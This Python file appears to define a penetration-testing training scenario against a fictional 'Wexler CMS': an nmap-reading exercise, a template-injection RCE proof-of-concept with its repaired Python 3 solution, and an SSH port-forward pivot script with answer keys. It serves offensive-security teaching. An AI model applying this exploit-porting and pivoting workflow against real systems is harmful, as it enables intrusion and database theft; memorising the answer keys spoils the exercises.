"""Chain mode: the Wexler Corp engagement, end to end.

Three stages, one story. A full TCP scan of a web host turns up an
old third-party CMS on a non-standard port; the public proof-of-concept for
that CMS is broken and has to be repaired to land a shell; and from the shell,
an internal database on a second subnet is reachable only through this host.
Find it, land it, reach it.

Everything here is fictional (crux D7): Wexler CMS is not real software and its
vulnerability is invented. The three judgements it drills are not.
"""

from __future__ import annotations

from ...model import ChainBody, Scenario, Stage
from ...model import Action, MarkBody
from ...model import SalvageBody
from ...model import ConduitBody
from ...targets._fixture import NmapScan, Note, Port
from ...targets._hits import Requirement
from ...targets.netns import ATTACKER, Link, Probe, Service, Topology

PLAYBOOK = 'PEN-200 Playbook'

# --------------------------------------------------------------------------
# Stage 1 - sift: find the way in
# --------------------------------------------------------------------------

_STAGE1 = MarkBody(
    prompt='A full TCP scan of the Wexler Corp web host has finished. Mark '
           'every line that changes what you do next.',
    fixture=NmapScan(
        noise=(0, 2),
        os_line='Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel',
        ports=(
            Port(22, 'ssh', 'OpenSSH 8.9p1 Ubuntu 3ubuntu0.4', kind='decoy',
                 why='Open on nearly every Linux host and almost never the way '
                     'in. It gets parked until you hold a credential, not '
                     'attacked because it is there.'),
            Port(80, 'http', 'Apache httpd 2.4.52 ((Ubuntu))', scripts=(
                Note('|_http-title: Wexler Corp'),
            )),
            Port(8080, 'http', 'Wexler CMS 2.0', kind='lead',
                 why='A named third-party product pinned to an exact version, '
                     'on a non-standard port. The Apache on 80 is the front '
                     'door everyone sees; this is the one with the exploit.',
                 scripts=(
                Note('|_http-title: Wexler CMS - Sign in'),
            )),
        ),
    ),
    actions=(
        Action('Look up Wexler CMS 2.0 for a known vulnerability and go '
               'straight for it.', True,
               'A pinned third-party product on a non-standard port is the '
               'way in on a box shaped like this. The Apache on 80 is the '
               'front door everyone sees; the application on 8080 is the one '
               'with the exploit.'),
        Action('Brute-force SSH on 22 with a userlist.',
               why='The reflex, and the rabbit hole. SSH gets parked until '
                   'you have a credential, not attacked because it is open.'),
        Action('Content-discover the Apache on 80 first.',
               why='Not wrong, just second. A pinned CMS version outranks an '
                   'unfingerprinted default web server every time.'),
    ),
)

# --------------------------------------------------------------------------
# Stage 2 - salvage: land the exploit
# --------------------------------------------------------------------------

_S2_BROKEN = r'''#!/usr/bin/env python
# Wexler CMS 2.0 - authenticated template import RCE (CVE fictional)
# tested on python 2.7
import urllib
import urllib2

TARGET = "{{URL}}"
PAYLOAD = "{{tpl.exec('id')}}"

def main():
    data = urllib.urlencode({"template": PAYLOAD, "name": "report"})
    req = urllib2.Request(TARGET + "/admin/import", data)
    print "[*] firing"
    print urllib2.urlopen(req).read()

if __name__ == "__main__":
    main()
'''

_S2_SOLUTION = r'''#!/usr/bin/env python3
# Wexler CMS 2.0 - authenticated template import RCE (CVE fictional)
import urllib.parse
import urllib.request
import urllib.error

TARGET = "{{URL}}"
PAYLOAD = "{{tpl.exec('id')}}"

def main():
    data = urllib.parse.urlencode({"template": PAYLOAD,
                                   "name": "report"}).encode()
    req = urllib.request.Request(TARGET + "/admin/import", data)
    print("[*] firing")
    try:
        print(urllib.request.urlopen(req).read().decode())
    except urllib.error.HTTPError as e:
        print(e.read().decode())

if __name__ == "__main__":
    main()
'''

_STAGE2 = SalvageBody(
    brief='The Wexler CMS on 8080 has a public proof-of-concept for its '
          'template import RCE. It was written for Python 2, which is not '
          'installed. Port it and land it to get your foothold.',
    filename='wexler_rce.py',
    defects=('Python 2 print statement', 'urllib2',
             'urlencode returns str not bytes'),
    cve='CVE-2018-7600', models='Drupal "Drupalgeddon2"',
    real_note=(
        'The public Drupalgeddon2 exploits were written for Python 2. On a '
        'current Kali they will not start until you port them, which is '
        'exactly the wall this stage puts in front of you.'
    ),
    route='/admin/import', reject_code=400,
    reject_message='template missing',
    broken=_S2_BROKEN, solution=_S2_SOLUTION,
    requirements=(
        Requirement('a POST', 'method', 'POST',
                    hint='the import endpoint only accepts POST'),
        Requirement('the import endpoint', 'route', '/admin/import',
                    hint='nothing arrived at /admin/import'),
        Requirement('a template payload', 'form', 'tpl.exec', key='template',
                    hint='the template field carried no payload'),
    ),
)

# --------------------------------------------------------------------------
# Stage 3 - conduit: reach the next host
# --------------------------------------------------------------------------

_S3_TOPOLOGY = Topology(
    hosts=(ATTACKER, 'web01', 'db01'),
    links=(Link(ATTACKER, 'web01', '10.9.0'), Link('web01', 'db01', '10.9.1')),
    services=(Service('db01', '10.9.1.2', 5432, 'WEXLER-DB-FLAG'),),
    sshd_on=('web01',),
    negative=(Probe(ATTACKER, '10.9.1.2', 5432, 'WEXLER', 'the database directly'),),
    probes=(Probe(ATTACKER, '127.0.0.1', 5432, 'WEXLER-DB-FLAG',
                  'the internal database on 127.0.0.1:5432'),),
)

_S3_STARTER = r'''#!/bin/sh
# You have a shell on web01 (10.9.0.2). `ip addr` shows a second interface on
# 10.9.1.0/24, and there is a PostgreSQL server on 10.9.1.2:5432 that only
# web01 can reach. You recovered an SSH key for the box (pivot@10.9.0.2:2222).
#
# Make the database answer on 127.0.0.1:5432 here so you can dump it.

SSH="ssh -F none -i {{ASSETS}}/id -p 2222 -N -f \
  -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
  -o ExitOnForwardFailure=yes"

# wrong direction:
$SSH -R 5432:10.9.1.2:5432 pivot@10.9.0.2
'''

_S3_SOLUTION = _S3_STARTER.replace('$SSH -R 5432', '$SSH -L 5432')

_STAGE3 = ConduitBody(
    brief='You have a shell on web01. A PostgreSQL server on the internal '
          'subnet answers only from this host. Forward it to '
          '`127.0.0.1:5432` on your own box. The script has the forward the '
          'wrong way round.',
    filename='pivot.sh',
    starter=_S3_STARTER, solution=_S3_SOLUTION,
    topology=_S3_TOPOLOGY,
)

# --------------------------------------------------------------------------

SCENARIOS = [
    Scenario(
        id='chain-wexler', track='chain', tier='verified', order=10,
        title='The Wexler Corp engagement',
        waypoint='foothold-attempt',
        source=f'{PLAYBOOK}/14 - Common PEN-200 Attack Chains.md',
        body=ChainBody(
            brief='**Wexler Corp, one web host, full scope.** Get in, get a '
                  'shell, and reach whatever is behind it. You have nothing '
                  'but the IP. Work the three judgements an engagement '
                  'actually turns on: read the scan for the way in, make the '
                  'public exploit for it actually run, and pivot from your '
                  'foothold to the next host.',
            stages=(
                Stage('sift', _STAGE1,
                      bridge='Recon is done.', title='Wexler Corp: recon'),
                Stage('salvage', _STAGE2, title='Wexler Corp: foothold',
                      bridge='**Wexler CMS 2.0 on 8080 is the way in.** Its '
                             'template import runs what it is given. The '
                             'public proof-of-concept is below, and it will '
                             'not even start. Repair it and land your '
                             'foothold as `www-data` on web01.'),
                Stage('conduit', _STAGE3, title='Wexler Corp: pivot',
                      needs=('ssh', 'sshd', 'ip'),
                      bridge='**You have a shell as `www-data` on web01.** '
                             '`ip addr` shows a second interface on '
                             '`10.9.1.0/24`, and a PostgreSQL server sits on '
                             '`10.9.1.2:5432` that only web01 can reach. '
                             'Pivot to it: forward it to `127.0.0.1:5432` on '
                             'your box so you can dump it.'),
            ),
            debrief='**That is a box, start to finish, and every stage was a '
                    'different kind of judgement.** Stage one was reading: the '
                    'way in was one pinned version among three open ports. '
                    'Stage two was repair: the exploit existed and did not '
                    'run, and no amount of re-reading the scan would have '
                    'helped. Stage three was reach: a foothold you cannot '
                    'pivot from is half a box. Waypoint owns the decision at '
                    'each node, hone owns the tools, and this is the thing '
                    'they are for. The internal database is where the real '
                    'loot usually is, which is why the pivot is not optional.',
        ),
    ),
]
